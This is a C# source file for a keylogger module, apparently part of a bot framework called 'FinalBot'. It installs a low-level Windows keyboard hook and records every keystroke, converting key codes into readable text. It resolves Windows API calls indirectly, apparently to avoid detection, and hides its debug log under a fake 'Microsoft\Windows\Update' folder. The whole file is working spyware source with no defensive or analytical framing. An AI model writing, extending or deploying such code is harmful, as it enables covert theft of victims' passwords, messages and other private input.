using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace FinalBot.Modules
{
    public static class KeyloggerModule
    {
        private const int _hType = 13; // WH_KEYBOARD_LL
        private const int _kDown = 0x0100; // WM_KEYDOWN
        private static LkProc _cb = HookCallback;
        private static IntPtr _hID = IntPtr.Zero;

        private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);

        private static class Native
        {
            public static SetHookDelegate? SetHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetHookDelegate>("SetWindowsHookExW");
            public static UnhookDelegate? Unhook => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookDelegate>("UnhookWindowsHookEx");
            public static CallNextDelegate? CallNext => VanguardCore.SafetyManager.ApiInterface.GetUser32<CallNextDelegate>("CallNextHookEx");
            public static GetModDelegate? GetMod => VanguardCore.SafetyManager.ApiInterface.GetKernel32<GetModDelegate>("GetModuleHandleW");
            public static GetMsgDelegate? GetMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetMsgDelegate>("GetMessageW");
            public static TransMsgDelegate? TransMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<TransMsgDelegate>("TranslateMessage");
            public static DispMsgDelegate? DispMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<DispMsgDelegate>("DispatchMessageW");
        }

        private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
        private delegate bool UnhookDelegate(IntPtr hhk);
        private delegate IntPtr CallNextDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr GetModDelegate(string lpModuleName);
        private delegate int GetMsgDelegate(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        private delegate bool TransMsgDelegate([In] ref MSG lpMsg);
        private delegate IntPtr DispMsgDelegate([In] ref MSG lpMsg);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        public static void Start()
        {
            System.Threading.Tasks.Task.Run(() =>
            {
                try
                {
                    _hID = SetHook(_cb);
                    if (_hID == IntPtr.Zero) return;

                    MSG msg;
                    var getMsg = Native.GetMsg;
                    var transMsg = Native.TransMsg;
                    var dispMsg = Native.DispMsg;

                    if (getMsg == null || transMsg == null || dispMsg == null) return;

                    while (getMsg(out msg, IntPtr.Zero, 0, 0) != 0)
                    {
                        transMsg(ref msg);
                        dispMsg(ref msg);
                    }
                }
                catch (Exception ex)
                {
                    DebugLog($"[KEYLOGGER ERROR] {ex.Message}");
                }
            });
        }

        public static void Stop()
        {
            try
            {
                if (_hID != IntPtr.Zero)
                {
                    Native.Unhook?.Invoke(_hID);
                    _hID = IntPtr.Zero;
                }
            }
            catch { }
        }

        private static void DebugLog(string msg)
        {
            try {
                string line = $"[{DateTime.Now:HH:mm:ss}] [KEYLOGGER] {msg}";
                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
                File.AppendAllText(Path.Combine(logDir, "svc_debug.log"), line + Environment.NewLine);
            } catch { }
        }

        private static IntPtr SetHook(LkProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule? curModule = curProcess.MainModule)
                {
                    if (curModule == null) return IntPtr.Zero;
                    var setHook = Native.SetHook;
                    var getMod = Native.GetMod;
                    if (setHook == null || getMod == null) return IntPtr.Zero;

                    return setHook(_hType, proc, getMod(curModule.ModuleName), 0);
                }
            }
            catch { return IntPtr.Zero; }
        }

        private static IntPtr HookCallback(int n, IntPtr w, IntPtr l)
        {
            try
            {
                if (n >= 0 && w == (IntPtr)_kDown)
                {
                    int vkCode = Marshal.ReadInt32(l);
                    string keyName = GetKeyName(vkCode);
                    Logger.Log(keyName, "KEY");
                }
            }
            catch { }
            
            var callNext = Native.CallNext;
            return callNext != null ? callNext(_hID, n, w, l) : CallNextHookEx_Fallback(_hID, n, w, l);
        }

        // Fallback or explicit call
        private static IntPtr CallNextHookEx_Fallback(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam) => IntPtr.Zero;

        private static string GetKeyName(int vkCode)
        {
            switch (vkCode)
            {
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x0D: return "[ENTER]\n";
                case 0x10: return "[SHIFT]";
                case 0x11: return "[CTRL]";
                case 0x12: return "[ALT]";
                case 0x14: return "[CAPS]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x2E: return "[DEL]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                default:
                    if (vkCode >= 0x30 && vkCode <= 0x39) return ((char)vkCode).ToString();
                    if (vkCode >= 0x41 && vkCode <= 0x5A) return ((char)vkCode).ToString();
                    return $"[VK:0x{vkCode:X2}]";
            }
        }
    }
}